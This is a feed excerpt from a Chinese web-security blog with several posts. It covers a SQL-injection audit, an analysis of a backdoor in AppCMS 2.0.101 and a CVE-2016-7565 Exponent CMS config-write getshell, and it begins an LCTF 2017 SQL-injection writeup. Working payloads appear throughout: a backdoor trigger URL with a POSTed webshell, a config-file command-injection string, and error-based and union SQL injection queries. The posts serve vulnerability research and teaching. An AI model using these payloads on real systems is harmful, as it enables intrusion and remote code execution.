<p>第84行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsloginpost</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">global</span> $tabhead;</div><div class="line"><span class="keyword">global</span> $txtchk;</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];$psw = authcode(@$psw, <span class="string">'ENCODE'</span>, <span class="string">'key'</span>,<span class="number">0</span>);</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">setcookie(<span class="string">"lggqsj"</span>,date(<span class="string">'Y-m-d H:i:s'</span>,time()+$loginlong), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>,<span class="string">"/; HttpOnly"</span> , <span class="string">""</span>,<span class="string">''</span>);</div><div class="line"></div><div class="line">$tab=$tabhead.<span class="string">"adusers"</span>;</div><div class="line">$chk=<span class="string">" where adnaa='"</span>.$user.<span class="string">"' and adpss='"</span>.$psw.<span class="string">"' "</span>;</div><div class="line">mysql_select_db($tab);</div><div class="line">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.$chk);</div><div class="line"><span class="keyword">if</span>(!$sql)&#123;$jieguo=<span class="string">"&lt;div id=redmsg&gt;(数据库查询失败!)&lt;/div&gt;"</span>;&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$num=mysql_num_rows($sql);</div><div class="line">				<span class="keyword">if</span>($num==<span class="number">0</span>)&#123;$jieguo=<span class="string">'&lt;div id=redmsg&gt;登录失败：账户或密码错误！&lt;/div&gt;'</span>;&#125;</div><div class="line">				<span class="keyword">else</span>&#123;</div><div class="line">loginpass($loginlong);</div><div class="line">				$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="index.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=index.php"&gt;'</span>;</div><div class="line">				@$chkmoblie=isMobile();</div><div class="line">				<span class="keyword">if</span>($chkmoblie==<span class="number">1</span>)&#123;$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="wap.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=wap.php"&gt;'</span>;&#125;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$json_arr = <span class="keyword">array</span>(<span class="string">"jieguo"</span>=&gt;$jieguo);</div><div class="line">$json_obj = json_encode($json_arr);</div><div class="line"><span class="keyword">echo</span> $json_obj;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以可以惊奇的发现，这里没有任何过滤，单引号也没有，啥都没有。。。。</p>
<p>为方便，我加了一句<code>echo $chk;</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/4.jpg?raw=true" alt=""></p>
<p>登陆成功。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继续水一水，把以前随手看的发上来。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>AppCMS 2.0.101 后门分析</title>
    <link href="http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-后门分析/</id>
    <published>2017-12-17T12:36:13.000Z</published>
    <updated>2018-01-25T06:19:28.476Z</updated>
    
    <content type="html"><![CDATA[<p>AppCMS 2.0.101 后门分析<br><a id="more"></a></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html" target="_blank" rel="external">http://www.appcms.cc/html/gengxin.html</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/4.png?raw=true" alt=""></p>
<p>官方的更新时间是 2015-8-1</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/1.png?raw=true" alt=""></p>
<p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/3.png?raw=true" alt=""></p>
<p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p>
<p>由代码知，这里存在一个copy函数构成的后门。</p>
<p>在第12行，实际执行的即为:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy(trim($_GET[url]),$_GET[cms]);</div></pre></td></tr></table></figure></p>
<p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/5.png?raw=true" alt=""></p>
<p>接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/6.png?raw=true" alt=""></p>
<p>getshell。</p>
<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p><a href="http://github.com/chybeta/cmspoc" target="_blank" rel="external">cmsPoc</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/tty.gif?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AppCMS 2.0.101 后门分析&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="后门分析" scheme="http://chybeta.github.io/tags/%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</title>
    <link href="http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-配置文件写入-getshell分析/</id>
    <published>2017-12-11T04:54:44.000Z</published>
    <updated>2017-12-11T23:21:25.681Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直在给<a href="https://github.com/CHYbeta/cmsPoc/wiki/Scripts" target="_blank" rel="external">cmsPoc</a>写各种cms的exp/poc。遇到了这个配置文件写入从而getshell的洞，想到了P神-代码审计圈里分享过的一道审计题，借此分析一波。<br><a id="more"></a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/tty.gif?raw=true" alt=""></p>
<p><a href="https://github.com/CHYbeta/cmsPoc/wiki/Scripts" target="_blank" rel="external">cmsPoc</a>里用的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">install/index.php?sc[SMTP_PORT]=25\\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p>下面基于这个payload进行分析。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 install/index.php 的第44行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"><span class="keyword">include_once</span>(<span class="string">'../exponent.php'</span>);</div><div class="line">expString::sanitize($_REQUEST);</div></pre></td></tr></table></figure></p>
<p>在 framework/core/subsystems/expString.php 的第502行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">(&amp;$data)</span> </span>&#123;</div><div class="line"><span class="comment">//        return $data;</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> (is_array($data)) &#123;</div><div class="line">		$saved_params = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($data[<span class="string">'controller'</span>]) &amp;&amp; $data[<span class="string">'controller'</span>] == <span class="string">'snippet'</span>) &#123;</div><div class="line">			$saved_params[<span class="string">'body'</span>] = $data[<span class="string">'body'</span>];  <span class="comment">// store snippet body</span></div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span> ($data <span class="keyword">as</span> $var=&gt;$val) &#123;</div><div class="line"><span class="comment">//                $data[$var] = self::sanitize($val);</span></div><div class="line">			$data[$var] = <span class="keyword">self</span>::xss_clean($val);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($saved_params)) &#123;</div><div class="line">			$data = array_merge($data, $saved_params);  <span class="comment">// add stored snippet body</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>由于 <code>$_REQUEST</code>是个数组，从代码中可以看到只经过了<code>xss_clean</code>的检查，这对我们的payload没有影响。因此经过<code>sanitize</code>后，仍然有<code>sc[SMTP_PORT]=25\\&#39;);echo `$_POST[chybeta]`;//</code></p>
<p>继续分析，install/index.php 的第56行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">// Create or update the config settings</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'sc'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"../framework/conf/config.php"</span>)) &#123;</div><div class="line">        <span class="comment">// Update the config</span></div><div class="line">        <span class="keyword">foreach</span> ($_REQUEST[<span class="string">'sc'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">            expSettings::change($key, $value);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对于一个已经安装完成的exponent，其文件<code>framework/conf/config.php</code>必定是存在的，所以当传入参数<code>$_REQUEST[&#39;sc&#39;]</code>，会进入更新config的流程。</p>
<p><code>expSettings::change</code>定义在 <code>framework\core\subsystems\expSettings.php</code>中的第220行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($var, $val)</span></span></div><div class="line">&#123;</div><div class="line">	$conf = <span class="keyword">self</span>::parseFile(BASE . <span class="string">'framework/conf/config.php'</span>);</div><div class="line">	$conf[$var] = $val;</div><div class="line">	<span class="keyword">self</span>::saveValues($conf);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>self::parseFile</code>定义在该文件的第140行，其作用是将config.php中的内容解析出来。接下去的一行，将我们传入的<code>$key</code>和<code>$value</code>进行设置，即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$var = &quot;SMTP_PORT&quot;</div><div class="line">$val = &quot;25\\&apos;);echo `$_POST[chybeta]`;//&quot;;</div><div class="line">$conf[$var]=$val;</div></pre></td></tr></table></figure></p>
<p>接下去进行写入，即<code>self::saveValues</code>，该函数定义在该文件expSettings.php的第175行左右：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">saveValues</span><span class="params">($values, $configname = <span class="string">''</span>)</span>  //<span class="title">FIXME</span> <span class="title">only</span> <span class="title">used</span> <span class="title">with</span> <span class="title">themes</span> <span class="title">and</span> <span class="title">self</span>::<span class="title">change</span><span class="params">()</span> <span class="title">method</span></span></div><div class="line">&#123;</div><div class="line">	$profile = <span class="keyword">null</span>;</div><div class="line">	$str = <span class="string">"&lt;?php\n"</span>;</div><div class="line">	<span class="keyword">foreach</span> ($values <span class="keyword">as</span> $directive =&gt; $value) &#123;</div><div class="line">		$directive = trim(strtoupper($directive));</div><div class="line">		<span class="keyword">if</span> ($directive == <span class="string">'CURRENTCONFIGNAME'</span>) &#123;  <span class="comment">// save and strip out the profile name</span></div><div class="line">			$profile = $value;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">		$str .= <span class="string">"define(\"$directive\","</span>;</div><div class="line">		$value = stripslashes($value); <span class="comment">// slashes added by POST</span></div></pre></td></tr></table></figure>
<p>可以看到对于<code>$value</code>，先经过了一次<code>stripslashes</code>，这会将value值中原有的反斜杠（<code>\</code>）去掉。<code>25\\&#39;);echo `$_POST[chybeta]`;//</code>中，25后面的第一个反斜杠（<code>\</code>）将会被去掉，再之后的一个反斜杠（<code>\</code>），被当作是后面单引号的转义符，因此不会被去除。因此<code>$value</code>的值为下面这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">25\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p>完成上述操作后，继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (substr($directive, <span class="number">-5</span>, <span class="number">5</span>) == <span class="string">"_HTML"</span>) &#123;</div><div class="line">	$value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);</div><div class="line"><span class="comment">//              $value = str_replace(array("\r\n","\r","\n"),"&lt;br /&gt;",$value);</span></div><div class="line">	$value = str_replace(<span class="keyword">array</span>(<span class="string">"\r\n"</span>, <span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="string">""</span>, $value);</div><div class="line"><span class="comment">//                $value = str_replace(array('\r\n', '\r', '\n'), "", $value);</span></div><div class="line">	$str .= <span class="string">"exponent_unhtmlentities('$value')"</span>;</div><div class="line">&#125; <span class="keyword">elseif</span> (is_int($value)) &#123;</div><div class="line">	$str .= <span class="string">"'"</span> . $value . <span class="string">"'"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> ($directive != <span class="string">'SESSION_TIMEOUT'</span>) &#123;</div><div class="line">		$str .= <span class="string">"'"</span> . str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $value) . <span class="string">"'"</span>;  <span class="comment">//FIXME is this still necessary since we stripslashes above???</span></div><div class="line">	&#125; <span class="comment">//                    $str .= "'".$value."'";</span></div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		$str .= <span class="string">"'"</span> . str_replace(<span class="string">"'"</span>, <span class="string">''</span>, $value) . <span class="string">"'"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$str .= <span class="string">");\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$str .= <span class="string">'?&gt;'</span>;</div><div class="line"><span class="comment">//		$configname = empty($values['CURRENTCONFIGNAME']) ? '' : $values['CURRENTCONFIGNAME'];</span></div><div class="line"><span class="keyword">if</span> ($configname == <span class="string">''</span>) &#123;</div><div class="line">$str .= <span class="string">"\n&lt;?php\ndefine(\"CURRENTCONFIGNAME\",\"$profile\");\n?&gt;"</span>; <span class="comment">// add  profile name to end of active profile</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">self</span>::writeFile($str, $configname);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>由于我们的payload为<code>sc[SMTP_PORT]</code>，不以<code>_HTML</code>结尾，且不为<code>SESSION_TIMEOUT</code>，因此会执行下面这条语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$str .= &quot;&apos;&quot; . str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, $value) . &quot;&apos;&quot;;</div></pre></td></tr></table></figure></p>
<p>对应前面的<code>$value</code>，它将<code>$value</code>中的单引号前又加上了一次反斜杠，导致<code>$value</code>的值现在变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">25\\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/1.png?raw=true" alt=""></p>
<p>最后的操作就是将得到的内容写入到配置文件中了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/2.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(&quot;SMTP_PORT&quot;,&apos;$value&apos;);</div><div class="line">即为</div><div class="line">define(&quot;SMTP_PORT&quot;,&apos;25\\&apos;);echo `$_POST[chybeta]`;//&apos;);</div></pre></td></tr></table></figure>
<p>由于第一个反斜杠的存在，它把第二个反斜杠给转义了，从而导致了后面这个单引号的逃逸，进一步的使我们能够成功的闭合define。接下来又利用了php的<code>//</code>注释将原有的括号注释掉，从而getshell。</p>
<h1 id="P神的审计题"><a href="#P神的审计题" class="headerlink" title="P神的审计题"></a>P神的审计题</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/3.png?raw=true" alt=""></p>
<p>与本次漏洞分析异曲同工之妙的一种解法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?option=aaa\&apos;;phpinfo();//</div></pre></td></tr></table></figure>
<p>经过addslashes后，$str为 <code>aaa\\\&#39;;phpinfo();//</code></p>
<p>经过preg_replace正则匹配后，对<code>\</code>做了转义处理,xxxxx/option.php的内容变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;aaa\\&apos;;phpinfo();//&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>同样利用第一个斜杠转义第二个斜杠，从而导致了单引号的逃逸。</p>
<p>另一种解答方法放在 <a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-3.md" target="_blank" rel="external">Code-Audit-Challenges PHP challenge-3</a></p>
<p>更多解答，请见代码审计-知识星球。</p>
<p>(那个，有没有广告费？)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直在给&lt;a href=&quot;https://github.com/CHYbeta/cmsPoc/wiki/Scripts&quot;&gt;cmsPoc&lt;/a&gt;写各种cms的exp/poc。遇到了这个配置文件写入从而getshell的洞，想到了P神-代码审计圈里分享过的一道审计题，借此分析一波。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>LCTF-2017-他们有什么秘密呢-writeup</title>
    <link href="http://chybeta.github.io/2017/11/19/LCTF-2017-%E4%BB%96%E4%BB%AC%E6%9C%89%E4%BB%80%E4%B9%88%E7%A7%98%E5%AF%86%E5%91%A2-writeup/"/>
    <id>http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/</id>
    <published>2017-11-19T12:54:01.000Z</published>
    <updated>2017-11-22T14:51:29.091Z</updated>
    
    <content type="html"><![CDATA[<p>补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点</p>
<p>LCTF-2017-他们有什么秘密呢-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一个简单到不能再简单的......</div><div class="line">http://182.254.246.93/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/10.png?raw=true" alt=""></p>
<p>这是第一关。查看源代码后，有如下tips：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;</div></pre></td></tr></table></figure></p>
<p>所以目标很明确。</p>
<p>经过测试，过滤了information等关键字。而union，select等则没有过滤。</p>
<p>参考<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></p>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>文章中利用的是Polygon()函数，这个也被过滤了。我换了linestring()来报错注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://182.254.246.93/entrance.php</div><div class="line"></div><div class="line">POST: pro_id=1 and linestring(pro_id)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/11.png?raw=true" alt=""></p>
<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库名：youcanneverfindme17</div><div class="line">表名：product_2017ctf</div><div class="line">部分字段名：pro_id</div></pre></td></tr></table></figure></p>
<p>除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p>
<ol>
<li>multiPolygon(id)</li>
<li>multilinestring(id)</li>
<li>GeometryCollection(id)</li>
<li>MultiPoint(id)</li>
</ol>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/18.png?raw=true" alt=""></p>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。</p>
<p>为了完整性，这里试一下注出字段名。</p>
<p>利用<a href="https://drive.google.com/file/d/0B0r_xEcaZ8-JYzk3NzA0NzItNTJlMS00YTUyLThkNTQtODVkYmU4ZjMzM2Rj/view" target="_blank" rel="external">orangetw大佬的提过的技巧</a></p>
<p>基本的原理是子查询中不允许出现相同的表名，本地环境测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/19.png?raw=true" alt=""></p>
<p>之后可以利用using来逐步爆出字段名：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/20.png?raw=true" alt=""></p>
<p>举一反三：</p>
<p>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</div><div class="line">Duplicate column name &apos;pro_name&apos;</div></pre></td></tr></table></figure></p>
<p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);</div><div class="line">Duplicate column name &apos;owner&apos;</div></pre></td></tr></table></figure></p>
<p>第三步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div><div class="line">Duplicate column name &apos;d067a0fa9dc61a6e&apos;</div></pre></td></tr></table></figure></p>
<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">库：youcanneverfindme17</div><div class="line">表：product_2017ctf</div><div class="line">字段: pro_id  pro_name owner,d067a0fa9dc61a6e</div></pre></td></tr></table></figure></p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>参考文章： <a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="external">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/</a></p>
